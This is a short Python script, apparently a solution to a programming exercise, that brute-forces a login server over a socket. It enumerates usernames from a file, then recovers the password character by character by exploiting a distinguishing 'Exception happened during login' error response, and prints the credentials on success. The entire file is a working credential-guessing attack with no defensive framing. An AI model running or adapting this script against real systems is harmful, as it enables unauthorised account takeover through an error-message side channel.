import socket
import sys
import os
import string
import json


def login_generator():
    with open(file_path) as file:
        login = file.read().splitlines()
    while True:
        for log in login:
            yield log


def main():
    ip_address, port = sys.argv[1:]
    with socket.socket() as conn:
        conn.connect((ip_address, int(port)))
        log = login_generator()
        characters = string.ascii_letters + string.digits
        while True:
            login = next(log)
            password = ' '
            message = json.dumps({
                "login": login,
                "password": password
            }).encode()
            conn.send(message)
            response = conn.recv(1024)
            if json.loads(response.decode())['result'] == "Wrong password!":
                break
        password = ''
        while True:
            char_iter = iter(characters)
            for char in char_iter:
                my_login = login
                message = json.dumps({
                    "login": my_login,
                    "password": password + char
                })
                conn.send(message.encode())
                response = conn.recv(1024)
                if json.loads(response.decode())['result'] == "Exception happened during login":
                    password += char
                    break
                elif json.loads(response.decode())['result'] == "Connection success!":
                    password += char
                    print(message)
                    exit()
                else:
                    continue


if __name__ == "__main__":
    file_path = os.path.join(os.path.dirname(__file__), "logins.txt")
    main()
